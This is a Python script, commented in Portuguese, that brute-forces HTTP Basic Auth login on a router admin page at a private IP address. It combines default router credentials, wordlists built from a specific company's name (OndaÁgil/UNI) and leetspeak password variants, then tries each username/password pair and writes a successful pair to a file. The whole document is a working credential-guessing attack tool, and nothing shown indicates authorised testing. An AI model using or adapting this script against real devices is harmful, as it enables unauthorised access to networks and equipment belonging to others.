import requests
import time
from itertools import product
from requests.auth import HTTPBasicAuth

# Gera a lista de senhas com base em variações de "codac sete"
def gerar_variacoes_codac7():
    global iniciais, finais, separadores
    iniciais = [
        "codac", "kodac", "kodak", "codak", "codaq", "kodaq", "qodac", "qodak", "kodaqc",
        "k0dac", "k0dak", "k0daq", "k0daqc", "c0dac", "c0dak", "c0daq", "c0daqc"
    ]
    finais = [
        "7", "07", "007", "sete", "Sete", "SETE", "set", "Set", "SET"
    ]
    separadores = ["", " ", "-", "_"]

    combinacoes = set()
    for p1, sep, p2 in product(iniciais, separadores, finais):
        base = f"{p1}{sep}{p2}"
        combinacoes.add(base.lower())
        combinacoes.add(base.upper())
        combinacoes.add(base.capitalize())
    return sorted(combinacoes)

def adicionar_pontos(senhas):
    global pontos
    pontos = ["", ".", ".."]
    novas_senhas = set()
    
    for senha in senhas:
        for pre in pontos:
            for pos in pontos:
                base = f"{pre}{senha}{pos}"
                novas_senhas.add(base)
                novas_senhas.add(base.lower())
                novas_senhas.add(base.upper())
                novas_senhas.add(base.capitalize())
    
    return sorted(novas_senhas)


# Lista de senhas padrão comuns
senhas_padrao_comuns = [
    "25345", "admin", "Admin", "root", "1234", "12345", "123456", "12345678",
    "admin123", "admin1234", "password", "senha", "guest", "default",
    "admin@123", "123", "pass", "admin1", "admin2", "admin!",
    "support", "super", "superuser", "user", "usuario", "modem",
    "internet", "router", "dlink", "tplink", "netgear",
    "00E04CBA8948", "NIIN28X6AR", "339744445336Gbs"
]

# Palavras relacionadas à empresa (OndaÁgil / UNI)
palavras_empresa = [
    "ondaagil", "OndaAgil", "OndaAgil123", "uni", "UNI", "ondauni", "ondaagiluni",
    "UNI123", "ondaagil@uni", "onda@123", "ondaagil1", "agilonda", "grupoUNI", "ondaUNI"
]

# Lista de usuários possíveis
usuarios_possiveis = [
    #"admin", "Admin", "root", "user", "25345",
    "00E04CBA8948", "NIIN28X6AR", "339744445336Gbs",
    "25345", "ondaagil", "OndaAgil", "OndaAgil123", "uni", "UNI", "ondauni", "ondaagiluni",
    "UNI123", "ondaagil@uni", "onda@123", "ondaagil1", "agilonda", "grupoUNI", "ondaUNI"
]

# Endereço do roteador
url = "http://192.168.2.1/"
#url = "http://10.0.1.1/LoginCheck"


# Junta todas as senhas
senhas_codac7 = gerar_variacoes_codac7()
todas_senhas_base = set(senhas_padrao_comuns + palavras_empresa) # + senhas_codac7
todas_as_senhas = adicionar_pontos(todas_senhas_base)  # Adiciona variações com pontos

# Função para calcular o total de combinações possíveis
def calcular_total_combinacoes():
    # Quantidades base
    qtd_iniciais = len(iniciais)
    qtd_finais = len(finais)
    qtd_separadores = len(separadores)
    qtd_variacoes_case = 3  # lower, upper, capitalize

    #senhas_codac7 = qtd_iniciais * qtd_separadores * qtd_finais * qtd_variacoes_case  # 17*4*9*3 = 1836

    senhas_padrao = len(senhas_padrao_comuns)  # Exemplo: 33
    palavras_empresa_qtd = len(palavras_empresa)  # Exemplo: 14

    senhas_base = + senhas_padrao + palavras_empresa_qtd # + senhas_codac7

    qtd_pontos = len(pontos) * 3  # "", ".", "..", "...", "...."
    variacoes_pontos = qtd_pontos * qtd_pontos  # prefixo × sufixo = 25

    total_senhas = senhas_base * variacoes_pontos

    qtd_usuarios = len(usuarios_possiveis)

    total_combinacoes = total_senhas * qtd_usuarios #* len(pontos)

    return total_combinacoes

# Controle de tempo e tentativas
tempo = 0.1
teste = 0
tentativas = calcular_total_combinacoes()
tentativas_f = f"{tentativas:,}".replace(',', '.')

# Testa cada combinação
for usuario, senha in product(usuarios_possiveis, todas_as_senhas):
    time.sleep(tempo)
    try:
        teste += 1
        resposta = requests.get(url, auth=HTTPBasicAuth(usuario, senha), timeout=3)
        print(f"SERÁ FEITO: {tentativas_f} TENTATIVAS")  #329.525
        print(f"QUEBRA DE SENHA POR FORÇA BRUTA EM: {url}")
        print("=====================================================")
        print(f"TESTE {f"{teste:,}".replace(',', '.')}, resposta='{resposta.status_code}'\nusuário='{usuario}', senha='{senha}'")
        print("=====================================================\n")
        
        if resposta.status_code == 302:
            print("⚠️ REDIRECIONAMENTO DETECTADO! ⚠️")

        if resposta.status_code == 200:
            print("✅ Sucesso!")
            print(f"Usuário: {usuario}")
            print(f"Senha: {senha}")
            # Salva no arquivo
            with open("USER_E_SENHA.txt", "w") as arquivo:
                arquivo.write(f"Usuário: {usuario}\n")
                arquivo.write(f"Senha: {senha}\n")
                arquivo.write(f"Teste nº: {f'{teste:,}'.replace(',', '.')}\n")
            break

        elif resposta.status_code == 401:
            continue

        else:
            print(f"⚠️ Resposta inesperada: {resposta.status_code}")

    except requests.exceptions.RequestException as e:
        print(f"Erro de conexão: {e}")
if teste >= tentativas:
    print("\nTODAS AS TENTATIVAS FORAM TENTADAS.\nE INFELIZMENTE NENHUMA DEU CERTO.")
